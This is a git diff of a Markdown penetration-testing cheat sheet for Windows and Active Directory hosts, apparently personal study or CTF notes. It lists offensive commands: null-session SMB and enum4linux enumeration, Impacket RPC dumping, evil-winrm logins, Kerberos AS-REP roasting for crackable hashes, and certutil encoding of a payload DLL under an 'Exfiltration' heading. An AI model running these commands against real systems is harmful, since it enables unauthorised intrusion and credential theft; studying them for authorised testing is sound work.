@@ -6,10 +6,12 @@
 ---
 
 - [DMP File](#dmp-file)
+- [Enum4Linux](#enum4linux)
+- [Enumeration](#enumeration)
 - [Exfiltration](#exfiltration)
 - [Kerberos](#kerberos)
-- [MSRPC](#msrpc)
 - [Ldap](#ldap)
+- [MSRPC](#msrpc)
 - [Samba](#samba)
 - [Virus](#virus)
 - [WinRM](#winrm)
@@ -21,19 +23,54 @@
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O
 ```
 
+<!--
+## Manual
+### Users
+- Guest
+- Administrator
+- krbtgt
+-->
+
+# Enum4Linux
+Enum4linux is a tool for enumerating information from Windows and Samba systems.
+
+### List Users
+```bash
+enum4linux -U ip
+```
+
+### Blank user
+```bash
+enum4linux -a -u '' -p '' ip
+```
+
+### With User
+```bash
+enum4linux -a -u user -p password ip
+```
+
 # Samba
 *Port: 445*
 
-### List Directories
+### Nmap
 ```bash
-smbclient  --no-pass -L //ip//
-smbclient -U user -L //ip//
+nmap -p 445 --script smb-os-discovery ip
+```
+
+### List Share
+```bash
+smbclient -L ip -U user
+```
+```bash
+smbclient -L ip --no-pass
 ```
 
 ### Connect
 ```bash
-smbclient "\\\\DOMAIN\\SHARENAME" --no-pass
-smbclient  "\\\\DOMAIN\\SHARENAME" -u USER -p PASSWORD
+smbclient '//ip/SHARE' --no-pass
+```
+```bash
+smbclient '//ip/SHARE' -U user%password
 ```
 
 ### SmbMap
@@ -50,26 +87,29 @@ crackmapexec smb ip -u users.txt -p password.txt
 # MSRPC
 *Port: 135*
 
+"MSRPC is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network." · [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)
+
 ### Connect
 ```bash
 rpcclient ip -U user -L -h
 ```
 
-### Source
-- [Different Outils](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
-
-# WinRM
-*Port: 5985*
-
-### Connect
-```bash
-evil-winrm -i ip -u user -p password
+### List Services
+```
+services.py user:password@987@ip list
+```
+```
+rpcdump.py user:password@987@ip
 ```
 
-# DMP File
-### Extract
+[*Impacket Docs*](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
+
+# WinRM
+*Port: 5985 / 5986*
+
+### Connect with powershell
 ```bash
-Foremost file.dmp
+evil-winrm -i ip -u user -p password
 ```
 
 # Kerberos
@@ -85,7 +125,7 @@ kerbrute userenum -d domain --dc ip user.txt
 ### Get user ticket
 Checking if Kerberos pre-authentication has been disabled for accounts
 ```
-GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip domain
+GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip DOMAIN/
 ```
 
 - [Kerberos cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
@@ -93,14 +133,16 @@ GetNPUsers.py -usersfile user.txt -no-pass -format hashcat -dc-ip ip domain
 # Ldap
 *Port: 389, 636*
 
+Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.
+
 ### Nmap
-```
-nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
+```bash
+nmap -n -sV --script "ldap* and not brute" -p 389 ip
 ```
 
 # Exfiltration
 ### Certificate
-```cmd
+```powershell
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
@@ -108,6 +150,12 @@ certutil -decode payload.b64 payload.dll
 ### Download file
 ```powershell
 Invoke-WebRequest -Uri http://example.com -OutFile file.out
+```
+
+# DMP File
+### Extract
+```bash
+Foremost file.dmp
 ```
 
 # Virus
